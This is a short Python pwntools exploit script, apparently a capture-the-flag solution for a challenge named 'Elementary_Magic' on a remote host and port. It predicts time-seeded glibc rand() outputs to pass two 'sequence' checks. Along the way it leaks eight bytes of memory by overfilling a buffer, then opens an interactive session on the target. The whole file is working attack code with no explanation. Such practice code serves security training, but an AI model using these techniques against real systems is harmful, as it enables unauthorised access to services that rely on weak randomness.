#!/usr/bin/env python3

from pwn import *
from ctypes import *
from ctypes.util import find_library

HOST = "34.126.117.161"
PORT = 2000

context.binary = elf = ELF('./challenge_patched', checksec = False)

# p = process(elf.path)
p = remote(HOST, PORT)

# glibc = cdll.LoadLibrary('./libc.so.6')
glibc = CDLL(find_library("c"))
glibc.srand(glibc.time(0))
p.recvuntil(b'================================Elementary_Magic================================\n') 
seed = p.recvline().strip()
v2 = glibc.rand()
p.sendline()
v3 = glibc.time(0)

ans = v2 ^ v3 ^ 0xDEADBEEFDEADC0DE 
p.sendafter(b'sequence!\n', str(c_longlong(ans).value))

p.sendlineafter(b'magic!\n', b'')
p.send(b'x'*0x20)
p.recvuntil(b'x'*0x20)
rd_leak = u64(p.recv(8)) 
p.sendline()
v0 = glibc.time(0)
glibc.srand(v0)
v6 = glibc.rand()

ans = rd_leak ^ v6 ^ 0xDEADBEEFDEADC0DE
p.sendafter(b'sequence!', str(c_longlong(ans).value))

p.interactive()